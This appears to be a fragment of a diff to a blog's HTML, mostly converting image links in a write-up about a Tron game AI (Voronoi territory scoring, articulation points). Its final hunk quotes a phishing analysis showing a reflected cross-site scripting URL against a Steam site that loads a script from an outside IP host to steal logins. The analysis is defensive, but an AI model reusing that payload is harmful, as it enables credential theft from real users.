 &lt;p&gt;This game was played against the contest winner, a1k0n, we&amp;#8217;re blue&amp;nbsp;again.&lt;/p&gt;
-&lt;p&gt;![](http://1.bp.blogspot.com/_X4W-
-h82Vgjw/S400bM6ucYI/&lt;span class="caps"&gt;AAAAAAAAPWU&lt;/span&gt;/NHcVB3sDxIE/s200/game5_2.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://1.bp.blogspot.com/_X4W-
+h82Vgjw/S400bM6ucYI/AAAAAAAAPWU/NHcVB3sDxIE/s200/game5_2.png"&gt;&lt;/p&gt;
 &lt;p&gt;Both players start of pretty&amp;nbsp;aggressive.&lt;/p&gt;
-&lt;p&gt;![](http://4.bp.blogspot.com/_X4W-h82Vgjw/S400eeK-
-z3I/&lt;span class="caps"&gt;AAAAAAAAPWY&lt;/span&gt;/EViduIwnoI0/s200/game5_3.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://4.bp.blogspot.com/_X4W-h82Vgjw/S400eeK-
+z3I/AAAAAAAAPWY/EViduIwnoI0/s200/game5_3.png"&gt;&lt;/p&gt;
 &lt;p&gt;Red makes a slight detour, so we go north to reach&amp;nbsp;him.&lt;/p&gt;
-&lt;p&gt;![](http://1.bp.blogspot.com/_X4W-&amp;nbsp;h82Vgjw/S400h5xPPXI/AAAAAAAAPWc/NdAumvqy9D4/s200/game5_4.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://1.bp.blogspot.com/_X4W-
+h82Vgjw/S400h5xPPXI/AAAAAAAAPWc/NdAumvqy9D4/s200/game5_4.png"&gt;&lt;/p&gt;
 &lt;p&gt;Then red turns around, an obvious mistake would be to follow him by going
 south. In the first part we&amp;#8217;ve mentioned this problem and included a fix to
 avoid these&amp;nbsp;dead-ends.&lt;/p&gt;
-&lt;p&gt;![](http://3.bp.blogspot.com/_X4W-&amp;nbsp;h82Vgjw/S400li8eGVI/AAAAAAAAPWg/y9aqw5TCOfE/s200/game5_5.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://3.bp.blogspot.com/_X4W-
+h82Vgjw/S400li8eGVI/AAAAAAAAPWg/y9aqw5TCOfE/s200/game5_5.png"&gt;&lt;/p&gt;
 &lt;p&gt;&amp;#8230;and thus we turn around as&amp;nbsp;well.&lt;/p&gt;
-&lt;p&gt;![](http://2.bp.blogspot.com/_X4W-&amp;nbsp;h82Vgjw/S400pFJbXRI/AAAAAAAAPWk/YIw1adE16aA/s200/game5_6.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://2.bp.blogspot.com/_X4W-
+h82Vgjw/S400pFJbXRI/AAAAAAAAPWk/YIw1adE16aA/s200/game5_6.png"&gt;&lt;/p&gt;
 &lt;p&gt;Alas, red is still able to close us off before we reach him. I actually
 consider this a well-played&amp;nbsp;game.&lt;/p&gt;
 &lt;h3&gt;An easier (and better) minimax evaluation function: Voronoi&amp;nbsp;territories&lt;/h3&gt;
@@ -10344,14 +10411,17 @@ evaluate their&amp;nbsp;positions.&lt;/p&gt;
 diagrams&lt;/a&gt;, a decomposition of
 space determined by distances to objects in that space (like points for
 example). When applied to the game of Tron, we could start with this simple&amp;nbsp;board:&lt;/p&gt;
-&lt;p&gt;![](http://2.bp.blogspot.com/_X4W-&amp;nbsp;h82Vgjw/S400uc5jzBI/AAAAAAAAPWo/zYmmrnEA4Jg/s1600/voronoi1.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://2.bp.blogspot.com/_X4W-
+h82Vgjw/S400uc5jzBI/AAAAAAAAPWo/zYmmrnEA4Jg/s1600/voronoi1.png"&gt;&lt;/p&gt;
 &lt;p&gt;To define our territory, we figure out the quickest way to reach each free
 square, both for us, and for our&amp;nbsp;opponent:&lt;/p&gt;
-&lt;p&gt;![](http://1.bp.blogspot.com/_X4W-&amp;nbsp;h82Vgjw/S400xVroxQI/AAAAAAAAPWs/rjp6uG3981Q/s320/voronoi2.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://1.bp.blogspot.com/_X4W-
+h82Vgjw/S400xVroxQI/AAAAAAAAPWs/rjp6uG3981Q/s320/voronoi2.png"&gt;&lt;/p&gt;
 &lt;p&gt;Our territory is defined by the squares we can reach quicker than our
 opponent, and vice verso. E.g. red&amp;#8217;s space is colored in light red, blue&amp;#8217;s
 space in light&amp;nbsp;blue:&lt;/p&gt;
-&lt;p&gt;![](http://2.bp.blogspot.com/_X4W-&amp;nbsp;h82Vgjw/S4001dkwqGI/AAAAAAAAPWw/O4tQoEJHYIM/s1600/voronoi3.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://2.bp.blogspot.com/_X4W-
+h82Vgjw/S4001dkwqGI/AAAAAAAAPWw/O4tQoEJHYIM/s1600/voronoi3.png"&gt;&lt;/p&gt;
 &lt;p&gt;If we apply this method to each board in our minimax tree, we can assign a
 score. For&amp;nbsp;example:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;_score_ = _size of our territory_ \- _size of their territory_
@@ -10365,8 +10435,8 @@ would make sense to block those off. Remember: an articulation point is a
 point such that removal (filling) that point would increase the number of
 disconnected &amp;#8220;chambers&amp;#8221;. For example, the articulation points in the board
 above&amp;nbsp;are:&lt;/p&gt;
-&lt;p&gt;![](http://1.bp.blogspot.com/_X4W-
-h82Vgjw/S4009Ad07HI/&lt;span class="caps"&gt;AAAAAAAAPW0&lt;/span&gt;/hROnW7-xPXM/s1600/artic1.png)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://1.bp.blogspot.com/_X4W-
+h82Vgjw/S4009Ad07HI/AAAAAAAAPW0/hROnW7-xPXM/s1600/artic1.png"&gt;&lt;/p&gt;
 &lt;p&gt;A good strategy checks whether we can reach those articulation points first,
 if it separates us from our opponent, and if doing so would result in more
 territory for us than our&amp;nbsp;opponent.&lt;/p&gt;
@@ -11295,7 +11365,7 @@ Moving slide-2.png
 &lt;p&gt;Needless to say, I was pretty surprised, I didn&amp;#8217;t know Steam accounts could expire. Sure enough the e-mail looks legit, it&amp;#8217;s mailed from support@steam.com, didn&amp;#8217;t get caught by Gmail&amp;#8217;s spam filter, and the corporate footer looks clean enough. If you have an eye for detail you might notice that there is a space missing here: &amp;#8220;click&amp;nbsp;here,login&amp;#8221;.&lt;/p&gt;
 &lt;p&gt;Let&amp;#8217;s check where this link leads&amp;nbsp;to:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="" src="http://4.bp.blogspot.com/_X4W-h82Vgjw/Su9Zd5oXnvI/AAAAAAAAPQY/jbSCOU8YTno/s400/Screenshot2.png"&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;https://cafe.steampowered.com/directory.php?country=AL&lt;span class="ni"&gt;&amp;amp;amp;&lt;/span&gt;state=&amp;#39;&lt;span class="ni"&gt;&amp;amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt;&lt;span class="err"&gt;%20src%3dhttp://92.241.190.202/~faaaaaaa/phising/steam/iframe.js&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;&amp;lt;&lt;/span&gt;/script%20src%3dhttp://92.241.190.202/~faaaaaaa/phising/steam/iframe.js&amp;gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;https://cafe.steampowered.com/directory.php?country=AL&lt;span class="ni"&gt;&amp;amp;amp;&lt;/span&gt;state=&amp;#39;&amp;gt;&lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt;&lt;span class="err"&gt;%20src%3dhttp://92.241.190.202/~faaaaaaa/phising/steam/iframe.js&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;&amp;lt;&lt;/span&gt;/script%20src%3dhttp://92.241.190.202/~faaaaaaa/phising/steam/iframe.js&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
